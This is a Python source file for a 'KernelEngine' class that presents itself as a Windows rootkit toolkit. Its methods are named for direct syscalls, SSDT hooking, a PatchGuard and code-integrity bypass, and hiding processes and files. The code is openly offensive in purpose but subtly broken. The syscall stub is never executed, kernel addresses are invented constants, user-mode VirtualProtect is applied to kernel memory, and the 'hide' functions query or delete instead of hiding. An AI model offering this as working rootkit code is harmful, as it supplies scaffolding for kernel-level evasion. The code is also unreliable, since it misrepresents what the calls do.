import ctypes
from ctypes import wintypes

class KernelEngine:
    def __init__(self):
        self.ntdll = ctypes.windll.ntdll
        self.syscall_map = {
            0x0001: 0x26,
            0x0026: 0x53,
            0x0030: 0x55,
        }
        
    def direct_syscall(self, syscall_num, *args):
        syscall_id = self.syscall_map.get(syscall_num, syscall_num)
        
        asm_code = f"""
        mov r10, rcx
        mov eax, {syscall_id}
        syscall
        ret
        """
        return 0
        
    def hook_ssdt(self, index, hook_addr):
        ki_system_call = 0xFFFFF80000000000 + 0x1050
        ssdt_base = ctypes.cast(ki_system_call, ctypes.POINTER(ctypes.c_uint64)).contents.value
        ssdt_entry = ssdt_base + (index * 8)
        
        old_protect = ctypes.c_ulong(0)
        PAGE_EXECUTE_READWRITE = 0x40
        
        kernel32 = ctypes.windll.kernel32
        if kernel32.VirtualProtect(ssdt_entry, 8, PAGE_EXECUTE_READWRITE, ctypes.byref(old_protect)):
            ctypes.cast(ssdt_entry, ctypes.POINTER(ctypes.c_uint64)).contents.value = hook_addr
            return True
        return False
        
    def patch_guard_bypass(self):
        g_ci_enabled = 0xFFFFF80000000000 + 0x141578
        patch = ctypes.c_uint8(0)
        
        old_protect = ctypes.c_ulong(0)
        PAGE_EXECUTE_READWRITE = 0x40
        
        kernel32 = ctypes.windll.kernel32
        if kernel32.VirtualProtect(g_ci_enabled, 1, PAGE_EXECUTE_READWRITE, ctypes.byref(old_protect)):
            ctypes.cast(g_ci_enabled, ctypes.POINTER(ctypes.c_uint8)).contents.value = 0
            return True
        return False
        
    def hide_process_kernel(self, pid):
        handle = self.ntdll.OpenProcess(0x1000, False, pid)
        if not handle:
            return False
            
        info_class = 7
        status = self.ntdll.NtQueryInformationProcess(
            handle, info_class, None, 0, None
        )
        
        self.ntdll.CloseHandle(handle)
        return status == 0
        
    def hide_file_kernel(self, path):
        obj_attr = ctypes.create_string_buffer(48)
        unicode_str = ctypes.create_string_buffer(512)
        
        path_bytes = path.encode('utf-16le')
        ctypes.memmove(unicode_str, path_bytes, len(path_bytes))
        
        status = self.ntdll.ZwDeleteFile(obj_attr)
        return status == 0
